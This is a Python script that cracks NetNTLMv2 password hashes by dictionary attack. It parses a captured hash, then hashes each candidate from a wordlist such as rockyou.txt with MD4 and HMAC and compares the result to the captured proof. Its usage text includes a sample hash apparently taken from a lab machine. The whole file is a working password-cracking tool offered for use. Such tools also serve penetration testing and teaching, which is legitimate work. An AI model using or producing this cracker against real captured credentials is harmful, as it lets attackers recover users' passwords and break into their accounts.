from Cryptodome.Hash import HMAC, MD4
from sys import argv 

if len(argv) != 3:
    print('''
walao why you dont know how to use this tool!!!
          
Usage:
pip install pycryptodome
python netntlmv2_crack.py <wordlist> <hash>

real life CLI example if your brain is alittle slower:

python netntlmv2_crack.py /usr/share/wordlists/rockyou.txt  'loserboy::VulnerableFYP:aaaaaaaaaaaaaaaa:6d6d0561c47ce8d6f44f11bde298e9be:010100000000000000433de1463fda01408e9cc3e7e80e2e000000000100100062004600440068005800560052007a000300100062004600440068005800560052007a000200100056006300640075007a006b00420056000400100056006300640075007a006b00420056000700080000433de1463fda0106000400020000000800300030000000000000000000000000200000acfe57bbc4264553d633c961cf65356232d0b3bcce76a27a4189da343f4bce630a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100330037002e003100330034000000000000000000'
''')
    exit(1)

wordlist = argv[1]
netntlmhash = argv[2]
passwordlist = open(wordlist,'rb').read().splitlines()

def parse_netntlmv2(netntlmhash:str) -> dict:
    tmp = netntlmhash.split(':')
    final = {
        'username' : tmp[0].upper().encode('utf-16le'),
        'domain' : tmp[2].encode('utf-16le'),
        'server_challenge' : bytes.fromhex(tmp[3]),
        'proof' : bytes.fromhex(tmp[4]),
        'blob' : bytes.fromhex(tmp[5])
    }
    return final

def brutecrack_netntlmv2(final:dict) -> bool | str:
    initial = final['username'] + final['domain']
    print("[+] Cracking the hash...")
    ctr = 0
    maximum = len(passwordlist)
    approx = maximum // 100 + 1
    for password in passwordlist:
        try:
            # this is for wordlists that uses byte encoding like rockyou.txt
            # remove this entire try except if you want it to be faster.
            password = password.decode().encode('utf-16-le')
        except:
            continue
        k1 = MD4.new(password).digest() # calculate first hash
        k2 = HMAC.new(k1,initial).digest() # calculate the second hash with the first hash
        if final['proof'] == HMAC.new(k2,final['server_challenge'] + final['blob']).digest(): # check against the proof bytes
            print(f'[+] Password Cracked  : {password.decode("utf-16-le")}')
            break
        ctr += 1
        if ctr % approx == 0:
            print(f'[!] Cracking progress : {round(ctr/maximum*100)}%')
    else:
        print(f'[x] Unfortunately the hash cannot be cracked with {wordlist}')

brutecrack_netntlmv2(parse_netntlmv2(netntlmhash))